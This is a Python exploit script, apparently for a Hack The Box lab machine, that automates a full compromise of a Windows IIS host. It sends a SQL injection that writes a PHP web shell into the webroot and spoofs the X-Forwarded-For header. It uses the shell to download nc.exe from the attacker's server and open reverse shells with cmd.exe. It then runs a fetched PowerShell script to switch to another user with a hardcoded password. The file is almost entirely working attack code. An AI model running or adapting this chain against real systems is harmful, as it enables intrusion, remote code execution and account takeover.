import pexpect
import sys
import os
import time

myHTBip = os.popen('ifconfig tun0 | grep "destination" | cut -d" " -f10').read().strip('\n')
port = 7777
port2 = 3344

print("Your HTB IP: "+myHTBip)
shell = pexpect.spawn('nc -lnvp '+str(port))

exploit_request= open("request.txt","w+")
exploit_request.write("productName=' union select \"<?php system($_GET['cmd']); ?>\",2,3,4,5,6 into outfile 'C:\\\\inetpub\\\\wwwroot\\\\badbug.php' #\n")
exploit_request.close()


print("Sending sqlinjection to upload web shell...")
time.sleep(1)
sqlinject = os.popen('curl -d "@request.txt" -X POST http://10.10.10.167/search_products.php -H "X-Forwarded-For: 192.168.4.28" 2>/dev/null ')

print("Start the Simple HTTP Server to upload nc.exe...")
time.sleep(1)
delete = os.popen('fuser -k 8000/tcp 2>/dev/null')
http_server = pexpect.spawn('/bin/sh')

#http_server.sendline('cd "$(dirname "$(locate nc.exe | head -n 1)")";python -m SimpleHTTPServer')
http_server.sendline('cd /usr/share/windows-resources/binaries;python -m SimpleHTTPServer')

print("Now execute web shell to make folder and download nc.exe...")
time.sleep(1)
makeFolder = os.popen('curl "http://10.10.10.167/badbug.php?cmd=mkdir%20C:\\\\bug" 2>/dev/null')
downloadNC = os.popen('curl "http://10.10.10.167/badbug.php?cmd=powershell;wget%20'+str(myHTBip)+':8000/nc.exe%20-OutFile%20C:\\\\bug\\\\nc.exe" 2>/dev/null')

time.sleep(1)

print("Nc back to us...")
time.sleep(1)
reverse_shell = os.popen('curl "http://10.10.10.167/badbug.php?cmd=C:\\bug\\nc.exe%20-e%20cmd.exe%20'+str(myHTBip)+'%20'+str(port)+'" 2>/dev/null')


print("Switch User to Hector with password: l33th4x0rhector")
try:
    shell.expect('C:*', timeout=8)
    shell.sendline('powershell')
    delete = os.popen('fuser -k 8000/tcp 2>/dev/null')
    http_server = pexpect.spawn('/bin/sh')
    http_server.sendline('cd /root/Desktop/htb/control;python -m SimpleHTTPServer')
    time.sleep(1)
    #shell.sendline('wget '+myHTBip+':8000/suhector.ps1 -OutFile C:\\bug\\suhector.ps1')
    downloadNC = os.popen('curl "http://10.10.10.167/badbug.php?cmd=powershell;wget%20'+str(myHTBip)+':8000/suhector.ps1%20-OutFile%20C:\\\\bug\\\\suhector.ps1" 2>/dev/null')
    time.sleep(1)
    shell.sendline('C:\\bug\\suhector.ps1')
    shell2 = pexpect.spawn('nc -lnvp '+str(port2))
    shell.sendline('C:\\bug\\nc.exe -e cmd.exe '+str(myHTBip)+' '+str(port2))
    shell2.interact()
except pexpect.TIMEOUT:
    print("!!! TIMEOUT !!!")
delete = os.popen('fuser -k 8000/tcp 2>/dev/null')
